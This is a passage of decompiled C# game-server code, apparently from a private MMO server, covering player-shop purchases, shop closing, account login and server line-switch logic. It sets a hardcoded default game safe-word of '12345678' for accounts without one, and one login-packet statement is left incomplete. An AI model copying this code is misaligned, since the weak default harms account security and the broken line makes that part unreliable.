								if (!players.个人商店.商店物品列表.TryGetValue(num4, out value))
								{
									出店(进店中ID);
								}
								else
								{
									int num6 = 得到包裹空位(this);
									if (num6 == -1)
									{
										购买物品提示(14);
										出店(进店中ID);
									}
									else if (num5 > value.数量)
									{
										出店(进店中ID);
									}
									else if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) == 0)
									{
										出店(进店中ID);
									}
									else if (BitConverter.ToInt64(players.装备栏包裹[value.位置].物品全局ID, 0) != num4)
									{
										出店(进店中ID);
									}
									else if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) != num3)
									{
										出店(进店中ID);
									}
									else if (num4 == 0L)
									{
										出店(进店中ID);
									}
									else if (value.价格 >= 0L && num5 >= 1)
									{
										if (players.个人商店.商店类型 == 2)
										{
											出店(进店中ID);
										}
										else
										{
											查百宝阁元宝数();
											players.查百宝阁元宝数();
											if (base.FLD_RXPIONT < value.价格 * num5)
											{
												购买物品提示(13);
												出店(进店中ID);
											}
											else
											{
												物品类 物品类 = 得到人物物品物品全局ID(players, num4);
												if (物品类 != null)
												{
													if (BitConverter.ToInt32(物品类.物品数量, 0) < value.数量)
													{
														出店(进店中ID);
														Form1.WriteLine(6, "非法复制_个人商店_进店1[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + value.数量 + "]");
														break;
													}
													if (World.Itme[BitConverter.ToInt32(物品类.物品ID, 0)].FLD_SIDE == 0 && BitConverter.ToInt32(物品类.物品数量, 0) > 1)
													{
														出店(进店中ID);
														Form1.WriteLine(6, "非法复制_个人商店_进店2[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类.得到物品名称() + "]  物品数量[" + BitConverter.ToInt32(物品类.物品数量, 0) + "]  数量[" + value.数量 + "]");
														break;
													}
													if (num5 < 1 || value.价格 < 0L)
													{
														出店(进店中ID);
														break;
													}
													string[] array3 = new string[25]
													{
														"[",
														players.Userid,
														"][",
														players.UserName,
														"]  个人商店买出物品  :[",
														base.Userid,
														"][",
														base.UserName,
														"]  (物品:",
														物品类.得到物品名称(),
														"/编号:",
														BitConverter.ToInt32(物品类.得到全局ID(), 0).ToString(),
														"属性:[",
														物品类.FLD_MAGIC0.ToString(),
														",",
														物品类.FLD_MAGIC1.ToString(),
														",",
														物品类.FLD_MAGIC2.ToString(),
														",",
														null,
														null,
														null,
														null,
														null,
														null
													};
													array3[19] = 物品类.FLD_MAGIC3.ToString();
													array3[20] = ",";
													array3[21] = 物品类.FLD_MAGIC4.ToString();
													array3[22] = "]  价格[";
													array3[23] = value.价格.ToString();
													array3[24] = "]";
													Form1.WriteLine(5, string.Concat(array3));
													players.检察元宝数据((int)(value.价格 * num5), 1);
													检察元宝数据((int)(value.价格 * num5), 0);
													string userid = players.Userid;
													string userName = players.UserName;
													string userid2 = base.Userid;
													string userName2 = base.UserName;
													double double_ = BitConverter.ToInt64(物品类.物品全局ID, 0);
													int int_ = BitConverter.ToInt32(物品类.物品ID, 0);
													string string_ = 物品类.得到物品名称();
													int int_2 = num5;
													string string_2 = 物品类.FLD_MAGIC0 + "-" + 物品类.FLD_MAGIC1 + "-" + 物品类.FLD_MAGIC2 + "-" + 物品类.FLD_MAGIC3 + "-" + 物品类.FLD_MAGIC4 + "初" + 0 + "中" + 0 + "进" + 0;
													int int_3 = (int)(value.价格 * num5);
													RxjhClass.物品记录(userid, userName, userid2, userName2, double_, int_, string_, int_2, string_2, int_3, "元宝商店");
													发包类 发包类 = new 发包类();
													发包类.Write(2);
													发包类.Write(2);
													发包类.Write4(num2);
													发包类.Write8(value.物品.Get物品ID);
													发包类.Write8(value.物品.Get物品全局ID);
													发包类.Write2(num5);
													发包类.Write2(value.位置);
													发包类.Write8(value.价格);
													发包类.Write4(value.物品.FLD_MAGIC0);
													发包类.Write4(value.物品.FLD_MAGIC1);
													发包类.Write4(value.物品.FLD_MAGIC2);
													发包类.Write4(value.物品.FLD_MAGIC3);
													发包类.Write4(value.物品.FLD_MAGIC4);
													发包类.Write2(value.物品.FLD_FJ_MAGIC0);
													发包类.Write2(value.物品.FLD_FJ_MAGIC1);
													发包类.Write2(value.物品.FLD_FJ_中级附魂);
													发包类.Write2(value.物品.FLD_FJ_MAGIC2);
													发包类.Write2(value.物品.FLD_FJ_MAGIC3);
													发包类.Write2(value.物品.FLD_FJ_MAGIC4);
													发包类.Write2(value.物品.FLD_FJ_MAGIC5);
													发包类.Write2(0);
													发包类.Write4(value.物品.FLD_KSSJ);
													发包类.Write4(value.物品.FLD_JSSJ);
													发包类.Write2(value.物品.FLD_FJ_NJ);
													发包类.Write4(value.物品.FLD_FJ_觉醒);
													发包类.Write2(0);
													发包类.Write2(value.物品.FLD_FJ_进化);
													发包类.Write2(0);
													发包类.Write4(0);
													发包类.Write4(0);
													发包类.Write4(0);
													发包类.Write8(num4);
													if (base.Client != null)
													{
														base.Client.SendPak(发包类, 52992, base.人物全服ID);
													}
													if (players.Client != null)
													{
														players.Client.SendPak(发包类, 52992, base.人物全服ID);
													}
													物品类.FLD_FJ_NJ = 0;
													增加物品(物品类.物品全局ID, 物品类.物品ID, num6, BitConverter.GetBytes(num5), 物品类.物品属性);
													players.减去物品(物品类.物品位置, num5);
													if (value.数量 - num5 > 0)
													{
														value.数量 -= num5;
													}
													else
													{
														players.个人商店.商店物品列表.Remove(num4);
													}
													保存元宝数据();
													players.保存元宝数据();
												}
												if (players.个人商店.商店物品列表.Count == 0)
												{
													players.个人商店.个人商店是否开启 = false;
													players.个人商店.商店物品列表.Clear();
													players.个人商店.进入人 = null;
													players.个人商店.Dispose();
													players.个人商店 = null;
													players.打开仓库中 = false;
													byte[] array4 = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
													System.Buffer.BlockCopy(array2, 0, array4, 12, 4);
													System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
													if (base.Client != null)
													{
														base.Client.Send(array4, array4.Length);
													}
													byte[] array5 = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
													System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array5, 4, 2);
													if (players.Client != null)
													{
														players.Client.Send(array5, array5.Length);
													}
													byte[] array6 = Converter.hexStringToByte("AA551A000000CA000C000100000000000000FFFFFFFF000000000000000055AA");
													System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array6, 14, 2);
													System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array6, 4, 2);
													if (players.Client != null)
													{
														players.Client.Send(array6, array6.Length);
													}
													players.发送当前范围广播数据(array6, array6.Length);
													进店中 = false;
													进店中ID = 0;
													打开仓库中 = false;
												}
												else
												{
													players.保存人物数据存储过程();
												}
												保存人物数据存储过程();
											}
										}
									}
									else
									{
										出店(进店中ID);
									}
								}
							}
						}
					}
					break;
				case 3:
					出店(num2);
					break;
				}
			}
			catch (Exception ex)
			{
				出店(进店中ID);
				Form1.WriteLine(1, "个人商店进店出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 关店()
		{
			int num = 0;
			try
			{
				byte[] array = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				num = 1;
				if (个人商店.进入人 != null)
				{
					num = 2;
					byte[] array2 = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 12, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(个人商店.进入人.人物全服ID), 0, array2, 4, 2);
					个人商店.进入人.进店中 = false;
					num = 3;
					个人商店.进入人.打开仓库中 = false;
					num = 4;
					个人商店.进入人.进店中ID = 0;
					num = 5;
					if (个人商店.进入人.Client != null)
					{
						个人商店.进入人.Client.Send(array2, array2.Length);
					}
					num = 6;
				}
				打开仓库中 = false;
				if (个人商店 != null)
				{
					个人商店.个人商店是否开启 = false;
					num = 7;
					个人商店.商店物品列表.Clear();
					num = 8;
					个人商店.Dispose();
					num = 9;
					个人商店.进入人 = null;
					个人商店 = null;
				}
				num = 10;
				byte[] array3 = Converter.hexStringToByte("AA551A000000CA000C000100000000000000FFFFFFFF000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 14, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
				num = 11;
				发送当前范围广播数据(array3, array3.Length);
				合成系统解锁();
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "个人商店关店出错![" + base.Userid + "]-[" + base.UserName + "]" + num + "|" + ex.Message);
			}
		}

		public void 出店(int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 12, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			进店中 = false;
			打开仓库中 = false;
			进店中ID = 0;
			Players players = 得到人物数据(人物ID);
			if (players != null)
			{
				players.个人商店.个人商店是否使用中 = false;
				players.个人商店.进入人 = null;
				byte[] array2 = Converter.hexStringToByte("AA5518000000CF000A0003030000000001000000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array2, 12, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array2, 4, 2);
				if (players.Client != null)
				{
					players.Client.Send(array2, array2.Length);
				}
			}
		}

		public void 连接登陆(byte[] 封包数据, int 封包大小)
		{
			try
			{
				PacketReader packetReader = new PacketReader(封包数据, 封包大小, false);
				packetReader.Seek(10, SeekOrigin.Begin);
				string text = packetReader.ReadString(29).Trim();
				if (text.Length > 16)
				{
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
				}
				else if (base.Userid.Length != 0)
				{
					封号(72, base.Userid, "人物名为空");
				}
				else
				{
					Players players = World.检查玩家(text);
					if (players != null)
					{
						if (players.Client.挂机)
						{
							World.离线数量--;
							if (World.离线数量 < 0)
							{
								World.离线数量 = 0;
							}
							players.Client.DisposedOffline();
						}
						else
						{
							players.Client.Dispose();
						}
						base.Client.Dispose();
					}
					else
					{
						packetReader.Seek(78, SeekOrigin.Begin);
						base.绑定帐号 = packetReader.ReadString(28).Replace("\0", string.Empty).Trim();
						if (检测多开限制(base.绑定帐号))
						{
							foreach (Players value in World.allConnectedChars.Values)
							{
								if (Buffer.IsEquals(value.绑定帐号, base.绑定帐号))
								{
									if (!value.Client.挂机)
									{
										value.Client.Dispose();
									}
									break;
								}
							}
						}
						base.Userid = text;
						World.conn.发送("用户登陆|" + text + "|" + base.Client.ToString() + "|" + World.服务器ID + "|" + base.人物全服ID + "|" + base.绑定帐号 + "|0|NULL");
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "连接登陆出错[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public bool 检测多开限制(string ipaddr)
		{
			try
			{
				int num = 0;
				foreach (Players value in World.allConnectedChars.Values)
				{
					if (Buffer.IsEquals(value.绑定帐号, ipaddr) && !value.Client.挂机)
					{
						num++;
					}
				}
				if (num >= World.允许多开数量)
				{
					return true;
				}
			}
			catch
			{
				return false;
			}
			return false;
		}

		public void 连接登陆2(string id, string aa, string 原服务器IP, string 原端口, string 银币IP, string 银币端口, string 原服务器序号, string 原服务器ID)
		{
			int num = 0;
			try
			{
				base.Client.在线 = true;
				DataTable dBToDataTable;
				if (aa != null && !(aa == "在线"))
				{
					foreach (NetState value in World.list.Values)
					{
						if (base.Client != null && value != base.Client && value.Player.Userid == id)
						{
							value.Dispose();
							if (base.Client != null)
							{
								base.Client.在线 = true;
							}
							if (base.Client != null)
							{
								base.Client.Dispose();
							}
							return;
						}
					}
					num = 1;
					base.Client.在线 = true;
					base.Client.登陆 = true;
					dBToDataTable = DBA.GetDBToDataTable(string.Format("select  FLD_PASSWORD,FLD_SEX,FLD_RXPIONT,FLD_RXPIONTX,FLD_VIP,FLD_VIPTIM,FLD_COIN,FLD_SAFEWORD,FLD_LASTLOGINIP  from  [TBL_ACCOUNT]  where  FLD_ID=@Userid"), new SqlParameter[1]
					{
						SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id)
					}, "rxjhaccount");
					num = 2;
					base.Password = dBToDataTable.Rows[0]["FLD_PASSWORD"].ToString();
					base.FLD_RXPIONT = (int)dBToDataTable.Rows[0]["FLD_RXPIONT"];
					base.FLD_RXPIONTX = (int)dBToDataTable.Rows[0]["FLD_RXPIONTX"];
					base.FLD_Coin = (int)dBToDataTable.Rows[0]["FLD_COIN"];
					base.FLD_VIP = int.Parse(dBToDataTable.Rows[0]["FLD_VIP"].ToString());
					base.FLD_VIPTIM = DateTime.Parse(dBToDataTable.Rows[0]["FLD_VIPTIM"].ToString());
					base.Player_Sex = int.Parse(dBToDataTable.Rows[0]["FLD_SEX"].ToString());
					base.lastloginip = dBToDataTable.Rows[0]["FLD_LASTLOGINIP"].ToString();
					if (dBToDataTable.Rows[0]["FLD_SAFEWORD"].ToString().Length == 0)
					{
						游戏安全码 = "12345678";
					}
					else
					{
						游戏安全码 = dBToDataTable.Rows[0]["FLD_SAFEWORD"].ToString();
					}
					if (World.vip线 != 1)
					{
						goto IL_02ce;
					}
					if (base.FLD_VIP != 1)
					{
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
					}
					else
					{
						if (base.FLD_VIP != 1 || !(DateTime.Now > base.FLD_VIPTIM))
						{
							goto IL_02ce;
						}
						if (base.Client != null)
						{
							base.Client.Dispose();
						}
					}
				}
				else
				{
					foreach (NetState value2 in World.list.Values)
					{
						if (base.Client != null && value2 != base.Client && value2.Player.Userid == id)
						{
							value2.Dispose();
							break;
						}
					}
					if (base.Client != null)
					{
						base.Client.Dispose();
					}
				}
				goto end_IL_0002;
				IL_02ce:
				base.原服务器序号 = int.Parse(原服务器序号);
				string text = "3      变量值" + 原服务器序号;
				base.原服务器IP = 原服务器IP;
				string text2 = "4      变量值" + 原服务器IP;
				base.原服务器端口 = int.Parse(原端口);
				string text3 = "5      变量值" + 原端口;
				base.原服务器ID = int.Parse(原服务器ID);
				base.银币广场服务器IP = 银币IP;
				string text4 = "7      变量值" + 银币IP;
				base.银币广场服务器端口 = int.Parse(银币端口);
				string text5 = "8      变量值" + 银币端口;
				num = 3;
				StringBuilder stringBuilder = new StringBuilder();
				if (World.是否加密2 == 1)
				{
					stringBuilder.Append("");
				}
				else
				{
					stringBuilder.Append
				}
				byte[] array = Converter.hexStringToByte(stringBuilder.ToString());
				System.Buffer.BlockCopy(BitConverter.GetBytes(51), 0, array, 22, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(World.服务器ID - 1), 0, array, 26, 4);
				if (World.是否加密2 == 1)
				{
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.Client.Key2), 0, array, 30, 4);
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				System.Buffer.BlockCopy(BitConverter.GetBytes(int.Parse(dBToDataTable.Rows[0]["FLD_SEX"].ToString())), 0, array, 14, 2);
				num = 5;
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (World.是否加密2 == 1)
				{
					base.Client.加密 = true;
				}
				Form1.WriteLine(3, "连接登陆成功[" + base.人物全服ID + "]-[" + id.ToString() + "]");
				num = 6;
				dBToDataTable.Dispose();
				end_IL_0002:;
			}
			catch (Exception ex)
			{
				if (base.Client != null)
				{
					base.Client.Dispose();
				}
				Form1.WriteLine(1, "连接登陆2()出错：" + num + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 换线账号登陆(string id, int 服务器ID, int 人物序号, int WorldID, string 绑定帐号, string 原服务器IP, string 原服务器端口, string 银币广场IP, string 银币广场端口, string 原服务器序号, string 原服务器ID, string 新服务器ID, string 封包登陆)
		{
			string str = "";
			try
			{
				base.Client.绑定帐号 = 绑定帐号;
				base.Client.版本验证 = true;
				if (World.允许挂机 == 1)
				{
					base.Client.挂机 = false;
				}
				base.Client.在线 = true;
				base.Client.登陆 = true;
				DataTable dataTable = DBA.GetDBToDataTable(string.Format("select  FLD_PASSWORD,FLD_SEX,FLD_RXPIONT,FLD_RXPIONTX,FLD_VIP,FLD_VIPTIM,FLD_COIN,FLD_SAFEWORD,FLD_ZT,FLD_LASTLOGINIP  from  [TBL_ACCOUNT]  where  FLD_ID=@Userid"), new SqlParameter[1]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id)
				}, "rxjhaccount");
				if (dataTable == null && base.Client != null)
				{
					kickidlog("换线账号登陆      出错      table1==null");
					base.Client.Dispose();
				}
				else
				{
					if (!(封包登陆 != "1"))
					{
						goto IL_00d1;
					}
					if (base.Client != null)
					{
						OpClient(1);
						base.Client.Dispose();
						goto IL_00d1;
					}
				}
				goto end_IL_0006;
				IL_0127:
				str = "2";
				base.原服务器序号 = int.Parse(原服务器序号);
				str = "3      变量值" + 原服务器序号;
				base.原服务器IP = 原服务器IP;
				try
				{
					base.原服务器端口 = int.Parse(原服务器端口);
				}
				catch (Exception)
				{
					base.原服务器端口 = World.游戏服务器端口;
				}
				try
				{
					base.原服务器ID = int.Parse(新服务器ID);
				}
				catch (Exception)
				{
					base.原服务器ID = World.服务器ID;
				}
				str = "5      变量值" + 新服务器ID;
				base.银币广场服务器IP = 银币广场IP;
				try
				{
					base.银币广场服务器端口 = int.Parse(银币广场端口);
				}
				catch (Exception)
				{
					base.银币广场服务器端口 = World.游戏服务器端口;
				}
				str = "6      变量值" + 银币广场端口;
				base.Userid = id;
				base.Password = dataTable.Rows[0]["FLD_PASSWORD"].ToString();
				base.FLD_RXPIONT = (int)dataTable.Rows[0]["FLD_RXPIONT"];
				base.FLD_RXPIONTX = (int)dataTable.Rows[0]["FLD_RXPIONTX"];
				base.FLD_Coin = (int)dataTable.Rows[0]["FLD_COIN"];
				base.FLD_VIP = int.Parse(dataTable.Rows[0]["FLD_VIP"].ToString());
				base.FLD_VIPTIM = DateTime.Parse(dataTable.Rows[0]["FLD_VIPTIM"].ToString());
				base.Player_Sex = int.Parse(dataTable.Rows[0]["FLD_SEX"].ToString());
				base.lastloginip = dataTable.Rows[0]["FLD_LASTLOGINIP"].ToString();
				if (dataTable.Rows[0]["FLD_SAFEWORD"].ToString().Length == 0)
				{
					游戏安全码 = "12345678";
				}
				else
				{
					游戏安全码 = dataTable.Rows[0]["FLD_SAFEWORD"].ToString();
				}
				dataTable.Dispose();
				if (World.vip线 != 1)
				{
					goto IL_03c0;
				}
				if (base.FLD_VIP != 1)
				{
					if (base.Client != null)
					{
						kickidlog("非VIP登录VIP线路");
						base.Client.Dispose();
					}
				}
				else
				{
					if (base.FLD_VIP != 1 || !(DateTime.Now > base.FLD_VIPTIM))
					{
						goto IL_03c0;
					}
					if (base.Client != null)
					{
						kickidlog("VIP过期");
						OpClient(1);
						base.Client.Dispose();
					}
				}
				goto end_IL_0006;
				IL_00d1:
				str = "1";
				if ((int)dataTable.Rows[0]["FLD_ZT"] <= 0)
				{
					goto IL_0127;
				}
				dataTable.Dispose();
				dataTable = null;
				if (base.Client == null)
				{
					goto IL_0127;
				}
				kickidlog("换线账号登陆      账号已停封");
				OpClient(1);
				base.Client.Dispose();
				goto end_IL_0006;
				IL_03c0:
				str = "7";
				Form1.WriteLine(3, "换线连接登陆成功[" + base.人物全服ID + "]-[" + id.ToString() + "]");
				str = "8";
				DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  FLD_NAME,FLD_X,FLD_Y,FLD_MENOW  from  [TBL_XWWL_Char]  where  FLD_ID=@Userid  and  FLD_INDEX=@index"), new SqlParameter[2]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, id),
					SqlDBA.MakeInParam("@index", SqlDbType.Int, 0, 人物序号)
				});
				if (dBToDataTable != null)
				{
					if (dBToDataTable.Rows.Count == 0 && base.Client != null)
					{
						Form1.WriteLine(1, "换线获取人物出错3，[" + base.Userid + "][" + base.UserName + "]");
						dBToDataTable.Dispose();
						base.Client.Dispose();
					}
					else
					{
						string string_ = dBToDataTable.Rows[0]["FLD_NAME"].ToString();
						float num = float.Parse(dBToDataTable.Rows[0]["FLD_X"].ToString());
						float num2 = float.Parse(dBToDataTable.Rows[0]["FLD_Y"].ToString());
						int int_ = (int)dBToDataTable.Rows[0]["FLD_MENOW"];
						dBToDataTable.Dispose();
						new Thread(new ThreadWithState(this, string_, num.ToString(), num2.ToString(), int_).ThreadProc2).Start();
					}
				}
				else if (base.Client != null)
				{
					kickidlog("获取人物出错4");
					Form1.WriteLine(1, "获取人物出错4，[" + base.Userid + "][" + base.UserName + "]");
					OpClient(1);
					base.Client.Dispose();
				}
				end_IL_0006:;
			}
			catch (Exception ex4)
			{
				if (base.Client != null)
				{
					kickidlog("换线账号登陆出错");
					base.Client.Dispose();
				}
				Form1.WriteLine(1, "换线账号登陆()出错      代码:" + str + "      信息2:" + ((ex4 != null) ? ex4.ToString() : null));
			}
		}

		public void 换线确认()
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA551B00AE04D60015000100000000B1040000000050C1000070410000AAC255AA");
				System.Buffer.BlockCopy(Buffer.GetBytes(base.人物坐标_地图), 0, array, 15, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 19, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 23, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 27, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "换线验证[" + base.人物全服ID + "]-[" + base.Client.ToString() + "]" + ex.Message);
			}
		}

		public void 复查用户登陆()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				foreach (NetState value12 in World.list.Values)
				{
					string value = "NULL";
					int value2 = 0;
					if (value12.挂机)
					{
						value2 = 1;
					}
					int value3 = 0;
					string value4 = string.Empty;
					string value5 = string.Empty;
					int value6 = 0;
					string value7 = string.Empty;
					string value8 = string.Empty;
					int value9 = 0;
					int value10 = 0;
					Players players = World.检查玩家世界ID(value12.WorldId);
					if (players != null)
					{
						value = players.UserName;
						value3 = players.原服务器序号;
						value4 = players.原服务器IP;
						value5 = players.原服务器端口.ToString();
						value6 = players.原服务器ID;
						value7 = players.银币广场服务器IP;
						value8 = players.银币广场服务器端口.ToString();
						value10 = players.Player_Job;
						公有药品类 value11;
						if (players.公有药品.TryGetValue(1008000027, out value11))
						{
							value9 = 1;
						}
					}
					stringBuilder.Append(value12.Player.Userid);
					stringBuilder.Append("-");
					stringBuilder.Append(value12.ToString());
					stringBuilder.Append("-");
					stringBuilder.Append(value12.绑定帐号);
					stringBuilder.Append("-");
					stringBuilder.Append(value2);
					stringBuilder.Append("-");
					stringBuilder.Append(value);
					stringBuilder.Append("-");
					stringBuilder.Append(value3);
					stringBuilder.Append("-");
					stringBuilder.Append(value4);
					stringBuilder.Append("-");
					stringBuilder.Append(value5);
					stringBuilder.Append("-");
					stringBuilder.Append(value6);
					stringBuilder.Append("-");
					stringBuilder.Append(value7);
					stringBuilder.Append("-");
					stringBuilder.Append(value8);
					stringBuilder.Append("-");
					stringBuilder.Append(value12.WorldId);
					stringBuilder.Append("-");
					stringBuilder.Append(value9);
					stringBuilder.Append("-");
					stringBuilder.Append(value10);
					stringBuilder.Append(",");
				}
				if (stringBuilder.Length > 0)
				{
					stringBuilder.Remove(stringBuilder.Length - 1, 1);
				}
				World.conn.发送("复查用户登陆|" + ((stringBuilder != null) ? stringBuilder.ToString() : null));
				if (World.AutGC != 0)
				{
					GC.Collect();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "复查用户登陆    错误" + ex.Message);
			}
		}

		public void 换线人物登陆(string UName, string x, string y, int map)
		{
			int num = 0;
			try
			{
				if (人物是否登陆)
				{
					复查用户登陆();
					kickidlog("已登陆人物换线登陆");
					World.conn.发送("踢出玩家ID|" + World.服务器ID + "|" + base.Userid);
					if (base.Client != null)
					{
						OpClient(1);
						base.Client.Dispose();
					}
				}
				else
				{
					人物是否登陆 = true;
					num = 1;
					base.UserName = UName;
					if (base.UserName.Length == 0)
					{
						kickidlog("换线人物登陆      人物名长度0");
						OpClient(1);
						base.Client.Dispose();
					}
					else if (Encoding.Default.GetBytes(base.UserName).Length > 12)
					{
						string text = "换线人物登陆      人物名太长[" + base.Userid + "][" + base.UserName + "]      [" + base.Client.ToString() + "]";
						kickidlog(text);
						Form1.WriteLine(99, text);
						OpClient(1);
						base.Client.Dispose();
					}
					else
					{
						num = 11;
						while (World.SqlPool.Count > 0)
						{
							Thread.Sleep(5);
						}
						读出人物数据();
						num = 2;
						换线确认();
						服务器时间();
						num = 3;
						检测走跑();
						门派荣誉称号();
						获得玫瑰称号属性();
						if (称号积分 >= int.Parse(World.至高无上称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.至高无上称号奖励[1]);
							base.称号追加防御 = int.Parse(World.至高无上称号奖励[2]);
							base.称号追加HP = int.Parse(World.至高无上称号奖励[3]);
							base.FLD_荣誉ID = 601;
							获取称号类型(1008001567, 1);
						}
						else if (称号积分 >= int.Parse(World.举世无双称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.举世无双称号奖励[1]);
							base.称号追加防御 = int.Parse(World.举世无双称号奖励[2]);
							base.称号追加HP = int.Parse(World.举世无双称号奖励[3]);
							base.FLD_荣誉ID = 602;
							获取称号类型(1008001568, 1);
						}
						else if (称号积分 >= int.Parse(World.雄霸天下称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.雄霸天下称号奖励[1]);
							base.称号追加防御 = int.Parse(World.雄霸天下称号奖励[2]);
							base.称号追加HP = int.Parse(World.雄霸天下称号奖励[3]);
							base.FLD_荣誉ID = 603;
							获取称号类型(1008001569, 1);
						}
						else if (称号积分 >= int.Parse(World.孤胆英雄称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.孤胆英雄称号奖励[1]);
							base.称号追加防御 = int.Parse(World.孤胆英雄称号奖励[2]);
							base.称号追加HP = int.Parse(World.孤胆英雄称号奖励[3]);
							base.FLD_荣誉ID = 604;
							获取称号类型(1008001570, 1);
						}
						else if (称号积分 >= int.Parse(World.英雄豪杰称号奖励[0]))
						{
							base.称号追加攻击 = int.Parse(World.英雄豪杰称号奖励[1]);
							base.称号追加防御 = int.Parse(World.英雄豪杰称号奖励[2]);
							base.称号追加HP = int.Parse(World.英雄豪杰称号奖励[3]);
							base.FLD_荣誉ID = 605;
							获取称号类型(1008001571, 1);
						}
						num = 4;
						初始化气功();
						num = 5;
						初始化装备篮包裹();
						发送任务物品列表();
						num = 6;
						初始化已装备物品();
						num = 7;
						Set个人药品();
						num = 8;
						num = 9;
						更新金钱和负重();
						num = 10;
						灵兽数();
						num = 11;
						num = 74;
						更新武功冷却();
						num = 12;
						set公有物品();
						Set追加状态物品();
						set称号物品();
						num = 13;
						计算人物装备数据();
						num = 15;
						更新武功和状态();
						num = 16;
						更新经验和历练();
						num = 29;
						更新荣誉();
						num = 17;
						if (师傅数据.TID != -1)
						{
							徒弟更新师徒系统();
						}
						else
						{
							for (int i = 0; i < 3; i++)
							{
								if (徒弟数据[i].TID != -1)
								{
									师傅更新师徒系统(i);
								}
								计算师徒属性(i);
							}
						}
						发送土灵符数据();
						num = 18;
						更新武功冷却();
						if (Logoin())
						{
							num = 19;
							Thread.Sleep(20);
							获取复查范围Npc();
							num = 20;
							Thread.Sleep(20);
							获取复查范围玩家();
							num = 21;
							Thread.Sleep(20);
							获取复查范围地面物品();
							num = 22;
							if (base.帮派Id != 0)
							{
								查帮派();
							}
							num = 25;
							if (base.Player_Job < 1 || base.Player_Job > 13)
							{
								封号(1, base.Userid, "非法人物登陆");
							}
							if (base.人物_HP <= 0)
							{
								移动(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
								base.人物_HP = base.人物最大_HP;
								更新HP_MP_SP();
								base.Player死亡 = false;
							}
							num = 24;
							switch (map)
							{
							default:
								关闭商店(73);
								break;
							case 801:
								关闭商店(73);
								if (int.Parse(x) == 520)
								{
									base.势力战派别 = "仙族";
									系统提示("您属于【仙族】,敌对势力为【黑披风烟雾效果】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
								}
								else if (int.Parse(x) == -520)
								{
									base.势力战派别 = "魔族";
									系统提示("您属于【魔族】,敌对势力为【白披风】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
								}
								break;
							case 101:
								关闭商店(6);
								break;
							}
							num = 27;
							更新移动速度();
							num = 28;
							其他();
							if (World.服务器ID == 28)
							{
								系统提示("你当前所在的线路是：银币互通线", 10, "线路提示");
							}
							else if (base.人物坐标_地图 == 801)
							{
								系统提示("欢迎进入仙魔大战！获胜方能获得丰厚奖励！", 10, "势力提示");
							}
							else
							{
								系统提示("你当前所在的线路是：" + World.服务器ID + "线", 10, "线路提示");
							}
							加载攻城数据();
							Thread.Sleep(20);
